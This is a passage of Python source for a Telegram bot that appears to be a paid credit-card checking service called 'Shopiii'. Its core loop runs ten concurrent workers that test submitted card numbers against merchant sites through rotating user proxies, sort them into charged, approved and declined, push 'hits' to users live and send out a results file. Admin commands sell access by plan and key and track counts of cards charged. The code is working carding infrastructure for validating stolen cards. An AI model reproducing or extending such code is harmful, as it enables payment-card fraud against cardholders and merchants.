        h, m, s = elapsed // 3600, (elapsed % 3600) // 60, elapsed % 60

        kb = [
            [pbtn(f"💳 {last_card_display[0]}", "none")],
            [pbtn(f"💰 Charged: {len(results['charged'])}", "none"),
             pbtn(f"✅ Approved: {len(results['approved'])}", "none")],
            [pbtn(f"❌ Declined: {len(results['declined'])}", "none"),
             pbtn(f"⚠️ Errors: {len(results['errors'])}", "none")],
            [pbtn(f"📊 {results['checked']}/{total}", "none")],
            [pbtn("🛑 Stop", f"stop_chk:{user_id}")]
        ]

        text = f"""{PE} <b>𝒮𝒽𝑜𝓅𝒾𝒾𝒾 ━ Processing (ran)</b> {PE}
━━━━━━━━━━━━━━━━━
{PE} Total ━ {total}
{PE} Checked ━ {results['checked']}/{total}
{PE} Time ━ {h}h {m}m {s}s
━━━━━━━━━━━━━━━━━"""

        try:
            await styled_edit(status_msg, text, buttons=kb,
                              emoji_ids=[CE["fire"], CE["fire"], CE["chart"], CE["bolt"], CE["star"]])
        except:
            pass

    queue = asyncio.Queue()
    for card in cards:
        queue.put_nowait(card)

    async def worker():
        while not queue.empty() and user_id in ACTIVE_MTXT_PROCESSES:
            try:
                card = queue.get_nowait()
            except asyncio.QueueEmpty:
                break

            current_proxies_data = await get_all_user_proxies(user_id)
            if not current_proxies_data:
                break
            current_proxies = [format_proxy_for_api(p) for p in current_proxies_data]

            res = await check_card_with_retry(card, sites, current_proxies, max_retries=2)
            results['checked'] += 1
            last_card_display[0] = f"{card[:12]}****"

            status = res['status']

            if status == 'Charged':
                results['charged'].append(res)
                await send_realtime_hit(user_id, res, "Charged", username)
                await send_card_result(event, res, status, is_private)
            elif status == 'Approved':
                results['approved'].append(res)
                if send_approved:
                    await send_realtime_hit(user_id, res, "Approved", username)
                    await send_card_result(event, res, status, is_private)
            elif status == 'Site Error' or status == 'Error':
                results['errors'].append(res)
            else:
                results['declined'].append(res)

            queue.task_done()

            now = time.time()
            if now - last_update[0] >= 2.0:
                last_update[0] = now
                await update_progress()

    try:
        workers = [asyncio.create_task(worker()) for _ in range(10)]

        while workers:
            if user_id not in ACTIVE_MTXT_PROCESSES:
                for w in workers:
                    if not w.done():
                        w.cancel()
                break
            done, pending = await asyncio.wait(workers, timeout=1.0)
            workers = list(pending)

        await update_progress()
        await asyncio.sleep(1)

        elapsed = int(time.time() - results['start_time'])
        h, m, s = elapsed // 3600, (elapsed % 3600) // 60, elapsed % 60

        final_text = f"""{PE} <b>𝒮𝒽𝑜𝓅𝒾𝒾𝒾 ━ Complete (ran)</b> {PE}
━━━━━━━━━━━━━━━━━
{PE} Total ━ {total}
{PE} Charged ━ {len(results['charged'])}
{PE} Approved ━ {len(results['approved'])}
{PE} Declined ━ {len(results['declined'])}
{PE} Errors ━ {len(results['errors'])}
━━━━━━━━━━━━━━━━━
{PE} Time ━ {h}h {m}m {s}s"""

        emoji_ids = [CE["party"], CE["party"], CE["chart"], CE["gem"],
                     CE["check"], CE["cross"], CE["warn"], CE["bolt"]]

        try:
            await status_msg.delete()
        except:
            pass

        await styled_send(event.chat_id, final_text, emoji_ids=emoji_ids)
        await send_final_file(user_id, results, event)

    finally:
        ACTIVE_MTXT_PROCESSES.pop(user_id, None)

@client.on(events.CallbackQuery(pattern=rb"stop_chk:(\d+)"))
async def stop_chk_callback(event):
    try:
        match = event.pattern_match
        process_user_id = int(match.group(1).decode())
        
        if event.sender_id != process_user_id and event.sender_id not in ADMIN_ID:
            return await event.answer("Not your process!", alert=True)
        
        if process_user_id not in ACTIVE_MTXT_PROCESSES:
            return await event.answer("No active process!", alert=True)
        
        ACTIVE_MTXT_PROCESSES.pop(process_user_id, None)
        await event.answer("Stopped!", alert=True)
    except Exception as e:
        await event.answer(f"Error: {e}", alert=True)

# ====================== ADMIN COMMANDS ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.](maintenance|maintance)\s+(on|off)$'))
async def maintenance_toggle(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"{PE} Admin only", emoji_ids=[CE["stop"]])
    
    args = event.raw_text.lower().split()
    action = args[1]
    
    if action == "on":
        await set_maintenance_mode(True)
        await styled_reply(event, f"{PE} <b>MAINTENANCE ENABLED</b>", emoji_ids=[CE["stop"]])
    else:
        await set_maintenance_mode(False)
        await styled_reply(event, f"{PE} <b>MAINTENANCE DISABLED</b>", emoji_ids=[CE["check"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]setplan'))
async def setplan_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"{PE} Admin only", emoji_ids=[CE["stop"]])
    try:
        parts = event.raw_text.split()
        user_id = int(parts[1])
        plan = parts[2].lower()
        days = int(parts[3]) if len(parts) > 3 else 30
        
        if plan not in ["free", "pro", "toji"]:
            return await styled_reply(event, f"{PE} Plan must be free/pro/toji", emoji_ids=[CE["cross"]])
        
        await ensure_user(user_id)
        await set_user_plan(user_id, plan, days)
        await styled_reply(event, f"{PE} User {user_id} ━ <b>{plan.upper()}</b> for {days} days", emoji_ids=[CE["check"]])
        
        try:
            await styled_send(
                user_id,
                f"{PE} <b>Plan Activated</b>\n━━━━━━━━━━━━━━━━━\n"
                f"{PE} Plan ━ <b>{plan.upper()}</b>\n"
                f"{PE} Duration ━ {days} days",
                emoji_ids=[CE["crown"], CE["star"], CE["chart"]]
            )
        except:
            pass
    except:
        await styled_reply(event, f"{PE} Usage: /setplan user_id plan days", emoji_ids=[CE["warn"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]ban\b'))
async def ban_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"{PE} Admin only", emoji_ids=[CE["stop"]])
    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await styled_reply(event, f"{PE} Usage: /ban user_id", emoji_ids=[CE["warn"]])
        
        user_id = int(parts[1])
        await ban_user(user_id, event.sender_id)
        await styled_reply(event, f"{PE} User {user_id} banned", emoji_ids=[CE["check"]])
    except Exception as e:
        await styled_reply(event, f"{PE} Error: {e}", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]unban\b'))
async def unban_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"{PE} Admin only", emoji_ids=[CE["stop"]])
    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await styled_reply(event, f"{PE} Usage: /unban user_id", emoji_ids=[CE["warn"]])
        
        user_id = int(parts[1])
        success = await unban_user(user_id)
        
        if success:
            await styled_reply(event, f"{PE} User {user_id} unbanned", emoji_ids=[CE["check"]])
        else:
            await styled_reply(event, f"{PE} User not banned", emoji_ids=[CE["cross"]])
    except Exception as e:
        await styled_reply(event, f"{PE} Error: {e}", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]genkey'))
async def genkey_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"{PE} Admin only", emoji_ids=[CE["stop"]])
    try:
        parts = event.raw_text.split()
        if len(parts) != 4:
            return await styled_reply(
                event,
                f"{PE} <b>Usage:</b>\n<code>/genkey plan amount days</code>\n\n"
                f"Example: <code>/genkey pro 5 30</code>",
                emoji_ids=[CE["warn"]]
            )
        
        plan_type = parts[1].lower()
        amount = int(parts[2])
        days = int(parts[3])
        
        if plan_type not in ["free", "pro", "toji"]:
            return await styled_reply(event, f"{PE} Plan: free, pro, or toji", emoji_ids=[CE["cross"]])
        
        if amount > 20:
            return await styled_reply(event, f"{PE} Max 20 keys", emoji_ids=[CE["cross"]])
        
        keys = []
        for _ in range(amount):
            key = generate_key()
            await create_plan_key(key, plan_type, days)
            keys.append(key)
        
        plan_emoji_map = {"free": "🆓", "pro": "💎", "toji": "👑"}
        pem = plan_emoji_map.get(plan_type, "⭐")
        
        keys_text = "\n".join([f"{PE} <code>{k}</code> ━ {pem} {plan_type.upper()} ━ {days}d" for k in keys])
        
        text = f"""{PE} <b>Plan Keys Generated</b>
━━━━━━━━━━━━━━━━━
{PE} Plan ━ {plan_type.upper()}
{PE} Amount ━ {amount}
{PE} Duration ━ {days} days
━━━━━━━━━━━━━━━━━

{keys_text}

━━━━━━━━━━━━━━━━━
{PE} Redeem with <code>/redeem KEY</code>"""
        
        await styled_reply(event, text,
                           emoji_ids=[CE["gift"], CE["crown"], CE["chart"], CE["star"]] + [CE["gem"]] * len(keys) + [CE["info"]])
    except Exception as e:
        await styled_reply(event, f"{PE} Error: {e}", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]keys$'))
async def keys_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"{PE} Admin only", emoji_ids=[CE["stop"]])
    
    rows = await get_all_plan_keys(50)
    
    if not rows:
        return await styled_reply(event, f"{PE} No keys generated", emoji_ids=[CE["warn"]])
    
    text = f"{PE} <b>Recent Keys</b>\n━━━━━━━━━━━━━━━━━\n"
    emoji_ids = [CE["gift"]]
    
    for row in rows[:30]:
        key = row.get("key")
        plan = row.get("plan_type", "pro").upper()
        days = row.get("days", 0)
        used = "✅" if row.get("used") else "🆓"
        text += f"{PE} <code>{key}</code> ━ {plan} ━ {days}d ━ {used}\n"
        emoji_ids.append(CE["gem"])
    
    await styled_reply(event, text, emoji_ids=emoji_ids)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]stats$'))
async def stats_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"{PE} Admin only", emoji_ids=[CE["stop"]])
    
    try:
        total_users = await get_total_users()
        premium_users = await get_premium_count()
        total_sites = await get_total_sites_count()
        total_cards = await get_total_cards_count()
        charged = await get_charged_count()
        approved = await get_approved_count()
        
        text = f"""{PE} <b>BOT STATISTICS</b>
━━━━━━━━━━━━━━━━━
{PE} Total Users ━ <code>{total_users}</code>
{PE} Premium Users ━ <code>{premium_users}</code>
{PE} Free Users ━ <code>{total_users - premium_users}</code>
━━━━━━━━━━━━━━━━━
{PE} Total Sites ━ <code>{total_sites}</code>
{PE} Total Cards ━ <code>{total_cards}</code>
{PE} Charged ━ <code>{charged}</code>
{PE} Approved ━ <code>{approved}</code>"""
        
        emoji_ids = [CE["chart"], CE["chart"], CE["info"], CE["crown"], CE["star"],
                     CE["link"], CE["bolt"], CE["gem"], CE["check"]]
        
        await styled_reply(event, text, emoji_ids=emoji_ids)
    except Exception as e:
        await styled_reply(event, f"{PE} Error: {e}", emoji_ids=[CE["cross"]])

# ====================== MAIN BOT FUNCTION ======================
async def run_bot():
    """Run the Telegram bot"""
    global client_instance
    client_instance = client
    
    print("🗄️ Initializing database...")
    await init_db()
    
    print("🚀 Starting Telegram bot...")
    await client.start(bot_token=BOT_TOKEN)
    print("✅ Bot started successfully!")
    
    await client.run_until_disconnected()

async def main():
    """Main entry point for bot"""
    while True:
        try:
            await run_bot()
        except FloodWaitError as e:
            wait_time = e.seconds + 5
            print(f"⚠️ FloodWait: sleeping {wait_time}s")
            await asyncio.sleep(wait_time)
        except Exception as e:
            print(f"❌ Bot error: {e}")
            print("🔄 Restarting in 10 seconds...")
            await asyncio.sleep(10)

# ====================== WEB SERVER FOR GUNICORN ======================
try:
    from flask import Flask, jsonify
    
    app = Flask(__name__)
    
    @app.route('/')
    @app.route('/health')
    def health_check():
        return jsonify({"status": "ok", "bot": "running", "timestamp": datetime.now().isoformat()}), 200
    
    @app.route('/ping')
    def ping():
        return "pong", 200
    
    # Start bot in background when Flask runs
    import threading
    
    def start_bot():
        """Start the Telegram bot in a background thread"""
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(main())
        except Exception as e:
            print(f"Bot thread error: {e}")
        finally:
            loop.close()
    
    # Start bot thread when module loads
    bot_thread = threading.Thread(target=start_bot, daemon=True)
    bot_thread.start()
    print("🐍 Bot thread started")
    
except ImportError:
    print("⚠️ Flask not installed - running in bot-only mode")
    # If Flask isn't installed, just run the bot directly
    if __name__ == "__main__":
        asyncio.run(main())

# This allows direct execution
if __name__ == "__main__":
    asyncio.run(main())
